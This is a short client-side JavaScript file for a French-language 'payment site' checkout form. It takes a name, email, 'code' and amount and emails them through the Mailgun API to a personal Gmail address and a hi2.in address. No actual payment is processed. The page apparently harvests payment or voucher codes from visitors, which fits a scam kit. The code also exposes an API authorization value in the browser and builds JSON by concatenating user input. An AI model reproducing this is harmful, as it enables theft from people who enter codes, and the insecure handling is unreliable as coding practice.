//document.getElementById("checkout-form").classList.add("hidden")

document.querySelectorAll(".payment-method").forEach((item) => {
  item.addEventListener("click", (event) => {
    document.getElementById("payment-choice").classList.add("hidden");
    document.getElementById("payment-choice-title").classList.remove("active");
    
    document.getElementById("checkout-form").classList.remove("hidden");
    document.getElementById("payment-title").classList.add("active");
      
  });
});

let form = document.getElementById("checkout-form");

form.addEventListener("submit", function (e) {
  e.preventDefault()

  let name = document.getElementById("name").value
  let email = document.getElementById("email").value;
  let code = document.getElementById("code").value;
  let amount = document.getElementById("amount").value;

  const body = new FormData();
  body.append("from", "Site de paiement");
  body.append("to", "massoudfataou@gmail.com");
  body.append("to", "mft@hi2.in");
  body.append("subject", "Nouvelle réponse provenant de votre site");
  body.append("template", "template_to_admin");
  body.append("h:X-Mailgun-Variables", '{ "mail": "' + email +'", "name": "' + name +'", "code": "' + code +'", "amount": "' + amount +'"}');

  fetch(
    "https://api.mailgun.net/v3/sandbox3a2fdd790ff34960bcd4e08b6e217fd0.mailgun.org/messages",
    {
      method : "POST",
      body : body,
      headers: {
        Authorization: "64574a68 - d20692a6"
      },
    }
  );
  //window.location.href = "./success.html"
 })